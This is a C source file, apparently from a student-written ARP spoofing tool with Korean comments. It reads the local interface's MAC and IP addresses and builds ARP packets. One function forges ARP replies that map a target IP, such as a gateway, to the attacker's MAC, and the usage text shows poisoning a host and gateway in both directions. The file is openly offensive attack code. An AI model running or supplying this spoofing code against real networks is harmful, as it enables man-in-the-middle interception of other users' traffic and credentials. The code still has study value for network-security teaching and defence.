#include "arp_packet.h"

void usage() {
    printf("syntax: arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample: arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

void ip_str_to_addr(char * str, uint8_t * addr){
    int nowNum = 0, nowidx = 0;
    int str_len = strlen(str);
    for(int i = 0; i < str_len; i++){
        if(str[i] == '.'){
            addr[nowidx++] = nowNum;
            nowNum = 0;
            continue;
        }
        nowNum *= 10;
        nowNum += str[i] - '0';
    }
    addr[nowidx] = nowNum; // x.y.z.k 에서 k는 이 순간 저장
}

void get_attacker_mac_addr(uint8_t * attacker_mac_addr, char * dev){
    int                 mib[6];
    size_t              len;
    char                *buf;
    unsigned char       *ptr;
    struct if_msghdr    *ifm;
    struct sockaddr_dl  *sdl;

    mib[0] = CTL_NET;
    mib[1] = AF_ROUTE;
    mib[2] = 0;
    mib[3] = AF_LINK;
    mib[4] = NET_RT_IFLIST;

    if ((mib[5] = if_nametoindex(dev)) == 0) {
        perror("if_nametoindex error");
        exit(2);
    }

    if (sysctl(mib, 6, NULL, &len, NULL, 0) < 0) {
        perror("sysctl 1 error");
        exit(3);
    }

    if ((buf = (char *)malloc(len)) == NULL) {
        perror("malloc error");
        exit(4);
    }

    if (sysctl(mib, 6, buf, &len, NULL, 0) < 0) {
        perror("sysctl 2 error");
        exit(5);
    }

    ifm = (struct if_msghdr *)buf;
    sdl = (struct sockaddr_dl *)(ifm + 1);
    ptr = (unsigned char *)LLADDR(sdl);
    memcpy(attacker_mac_addr, ptr, MAC_address_length);
}

void get_attacker_ip_addr(uint8_t * attacker_ip_addr, char * dev){
    struct ifreq ifr;
    char ipstr[40];
    int s;
 
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
 
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
        printf("Error");
    } 
    else {
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ipstr,sizeof(struct sockaddr));
        ip_str_to_addr(ipstr, attacker_ip_addr);
    }
};

void copy_6byte(uint8_t * src, uint8_t * dst){
    for(int i = 0; i < 6; i++){
        dst[i] = src[i];
    }
}
void copy_4byte(uint8_t * src, uint8_t * dst){
    for(int i = 0; i < 4; i++){
        dst[i] = src[i];
    }
}
void copy_6byte_by_one_bit(uint8_t bit, uint8_t * dst){
    for(int i = 0; i < 6; i++){
        dst[i] = bit;
    }
}
void copy_4byte_by_one_bit(uint8_t bit, uint8_t * dst){
    for(int i = 0; i < 4; i++){
        dst[i] = bit;
    }
}

arp_packet arp_request_get_mac_addr
(uint8_t * attacker_mac, uint8_t * object_ip, uint8_t * attacker_ip){ // dst_mac 을 모르는 상황
    arp_packet send_packet;

    copy_6byte_by_one_bit(0xff, send_packet.destination_mac_address);
    copy_6byte(attacker_mac, send_packet.source_mac_address);
    send_packet.ethertype = htons(Ethertype_ARP); // 2byte
    send_packet.hardware_type = htons(ARP_hardware_type_Ethernet); // 2byte
    send_packet.protocol_type = htons(Ethertype_IPv4); // 2byte
    send_packet.hardware_length = MAC_address_length; // 1byte
    send_packet.protocol_length = IPv4_address_length; // 1byte
    send_packet.operation = htons(ARP_operation_request); // 2byte
    copy_6byte(attacker_mac, send_packet.sender_hardware_address);
    copy_4byte(attacker_ip, send_packet.sender_protocol_address);
    copy_6byte_by_one_bit(0x00, send_packet.target_hardware_address);
    copy_4byte(object_ip, send_packet.target_protocol_address);
    
    return send_packet;
}

arp_packet arp_reply_target_ip_with_attacker_mac
(uint8_t * attacker_mac, uint8_t * sender_mac, uint8_t * target_ip, uint8_t * sender_ip){
    arp_packet send_packet;

    copy_6byte(sender_mac, send_packet.destination_mac_address);
    copy_6byte(attacker_mac, send_packet.source_mac_address);
    send_packet.ethertype = htons(Ethertype_ARP); // 2byte
    send_packet.hardware_type = htons(ARP_hardware_type_Ethernet); // 2byte
    send_packet.protocol_type = htons(Ethertype_IPv4); // 2byte
    send_packet.hardware_length = MAC_address_length; // 1byte
    send_packet.protocol_length = IPv4_address_length; // 1byte
    send_packet.operation = htons(ARP_operation_reply); // 2byte

    copy_6byte(attacker_mac, send_packet.sender_hardware_address);
    copy_4byte(target_ip, send_packet.sender_protocol_address);
    copy_6byte(sender_mac, send_packet.target_hardware_address);
    copy_4byte(sender_ip, send_packet.target_protocol_address);

    return send_packet;
}

void print_6byte_mac(uint8_t * source){
    for(int i = 0; i < 6; i++){
        printf("%02x", source[i]);
        if(i != 5) printf(":");
        else printf("\n");
    }
}